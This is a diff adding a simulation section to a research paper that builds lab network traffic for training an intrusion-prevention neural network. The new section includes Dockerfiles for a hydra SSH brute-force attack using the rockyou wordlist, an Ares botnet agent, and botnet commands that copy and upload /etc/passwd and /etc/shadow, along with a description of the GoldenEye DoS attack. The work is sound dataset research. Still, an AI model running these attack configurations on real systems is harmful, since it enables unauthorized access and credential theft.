@@ -7,6 +7,7 @@
 \usepackage{graphicx}
 \usepackage{textcomp}
 \usepackage{xcolor}
+\usepackage{listings}
 \def\BibTeX{{\rm B\kern-.05em{\sc i\kern-.025em b}\kern-.08em
     T\kern-.1667em\lower.7ex\hbox{E}\kern-.125emX}}
 \begin{document}
@@ -150,7 +151,129 @@ All Ansible commands must be executed within the gns3 folder and need the sudo p
 The next chapter focuses on the implementation and simulation of specific scenarios within a GNS3 project with the help of the introduced infrastructure to produce a new dataset for evaluating neural networks in IPS systems.  
 
 \section{Simulation}
-@Bernhard [2-3p]
+Benign and malicious traffic have to be generated for multiple scenarios in order to provide a diverse dataset that can be used to train the neural network. As previously mentioned these scenarios are divided into separate groups, each with their own recorder so that benign and malicious traffic do not mix. Each attack and its benign counterpart were implemented using Docker containers which can be found on Dockerhub.
+
+\subsection{Secure Shell (SSH)}
+SSH is one of the most common protocols used today. By utilizing it secure connections over the internet can be established to remote servers in order to execute commands or copy files from one machine to another. Simulating such a configuration therefore requires a server, a benign client and a malicious client
+
+\subsubsection{SSH server}
+To allow a client to connect to the SSH Server, the client has to exist on the remote host. We therefore added a new user with a known password to the server. Because the password can only be set in an interactive way via useradd, we had to use the chpasswd utility. 
+The configuration of the server can be seen below: 
+
+\begin{lstlisting}[basicstyle=\footnotesize]
+FROM ubuntu:latest
+
+RUN apt-get update && \ 
+    apt-get install -y openssh-server && \
+    mkdir -p /var/run/sshd && \
+    useradd technikum -m -d /home/technikum && \
+    echo technikum:technikum | chpasswd
+
+EXPOSE 22
+CMD ["/usr/sbin/sshd", "-D"]
+\end{lstlisting}
+
+\subsubsection{Benign client}
+The idea behind our implementation of benign SSH traffic is to first connect to an SSH server. Secondly, send commands that are executed on executed on the remote server which return a response message that generates traffic over the network. Because each command will only produce a minute amount of traffic multiple clients are needed to increase the data volume. Furthermore, since it is not possible to enter a password via the default ssh tool in a non-interactive way sshpass had to be installed. This utility allows us to provide the password used for the SSH login in a non-interactively. The exact implementation of the benign traffic container that was used in our simulation can be seen below:
+
+\begin{lstlisting}[basicstyle=\footnotesize]
+FROM ubuntu:latest
+
+ENV targetip=192.168.1.100
+ENV command="echo test; mkdir test; rmdir test;"
+
+RUN apt-get update && \ 
+    apt-get install -y sshpass
+    
+ENTRYPOINT while true; do sshpass -p "technikum" \ 
+			ssh -o StrictHostKeyChecking=no \
+			"technikum@${targetip}" ${command}; \
+			sleep 5; done
+\end{lstlisting}
+
+\subsubsection{Malicious client}
+By making use of a password list an SSH brute-force attack can be executed quite easily on an SSH server. An attacker uses the list in combination with a given username to attempt a successful login on the victim machine. Luckily, some Docker images created for pen-testing come equipped with such password lists already. The utility that was used to attack the SSH server is called hydra, a parallelized password cracking tool which supports multiple protocols and the use of password lists. To further increase the generated data multiple containers were used.
+The configuration of the malicious ssh containers can be seen below:
+
+\begin{lstlisting}[basicstyle=\footnotesize]
+FROM c4nc/kalibase:latest
+
+RUN gunzip /usr/share/wordlists/rockyou.txt.gz
+
+ENTRYPOINT ["hydra", "-l", "root", \
+            "-P", "/usr/share/wordlists/rockyou.txt", \
+            "192.168.0.10", "-t", "4", "ssh"]
+\end{lstlisting}
+
+\subsection{Botnet}
+The second scenario that was used is a botnet. In a botnet a master or server controls multiple agents to perform some action. Screenshots, file downloads, uploads, installations and much more can be done once the server has control over the infected pc. 
+
+\subsubsection{Server}
+The server controls the agents with a list of commands. The server send these commands out to the agents which then perform the requested operations. In our simulation we let all clients do the following operations repeatedly:
+
+\begin{lstlisting}[basicstyle=\footnotesize]
+apt -y install tor
+download http://ipv4.download.thinkbroadband.com/5MB.zip
+screenshot
+mkdir -p /tmp/zzz
+cp /etc/passwd /tmp/zzz/
+cp /etc/shadow /tmp/zzz/
+zip zzz.zip /tmp/zzz/
+upload zzz.zip
+rm -rf /tmp/zzz zzz.zip 5MB.zip
+apt -y remove tor
+download http://ipv4.download.thinkbroadband.com/100MB.zip
+apt -y install curl wget netcat
+
+\end{lstlisting}
+
+\subsubsection{Agent}
+Similarly to the benign traffic, a single host would not generate a noticeable amount of network traffic. Multiple agents were added to the scenario to increase the generated data. By using Ares the required configuration for the agents is the port and IP address of the control server:
+
+\begin{lstlisting}[basicstyle=\footnotesize]
+FROM ubuntu:18.04
+USER root
+WORKDIR /opt
+
+RUN apt-get update && \
+    apt-get install -y \
+      git \
+      python-pip && \
+    apt-get clean all
+
+RUN git clone https://github.com/sweetsoftware/Ares.git && \
+    cd Ares && \
+    pip install -r requirements.txt
+
+ARG SERVER=192.168.0.200
+ARG PORT=8080
+WORKDIR /opt/Ares/agent
+RUN sed -i "s/localhost/$SERVER/g" ./config.py
+RUN sed -i "s/8080/$PORT/g" ./config.py
+ENTRYPOINT ["./agent.py"]
+\end{lstlisting}
+
+\subsection{Goldeneye}
+Goldeneye is a DoS attack that can take down webservers. Similar to other DoS tools like Slowloris it occupies all available sessions of the webserver and therefore locks out anyone else trying to connect to it. Unlike Slowloris it uses Keep-Alive to keep its connected sessions alive. 
+In order to be able to use this attack a webserver must be provided. Because of performance issues the attack could not be ran continuously and had to be timed out every few minutes. 
+
+\subsection{Benign traffic}
+Network traffic consists of many different network protocols and connections. Furthermore, attacks generally speaking are only a small portion of the network traffic. Most of the traffic is benign traffic that also has to be simulated in some way in our environment. To overcome this problem multiple benign containers were started that generated harmless traffic. Downloading files and browsing the internet are the most common type of traffic in normal network. Although it is worth mentioning that the definition of normal traffic is highly dependant on what kind of servers are connected to the network. A server farm for example has a different definition of normal traffic than a home network regarding amount and protocols used.
+For our environment we considered file downloads and web browsing as normal traffic.
+Hence, Docker containers that downloaded 10MB, 100MB files were added to the network. A third container was added to browse the web. The containers do not store the downloaded files anywhere. They are redirected to /dev/null meaning the containers do not need any significant amount of storage space but still download every byte of the requested file before restarting. After the downloads are finished the container waits 5 seconds before it retries the same operation. The configurations of these containers can be seen below:
+
+\begin{lstlisting}[basicstyle=\footnotesize]
+FROM ubuntu:latest
+
+ENV website="google.at"
+
+RUN apt-get update && \
+    apt-get install -y wget
+    
+ENTRYPOINT  while true; \
+            do wget -O /dev/null ${website}; \ 
+            sleep 5; done
+\end{lstlisting}
 
 \section{Conclusion}
 @Damir [0.5p]
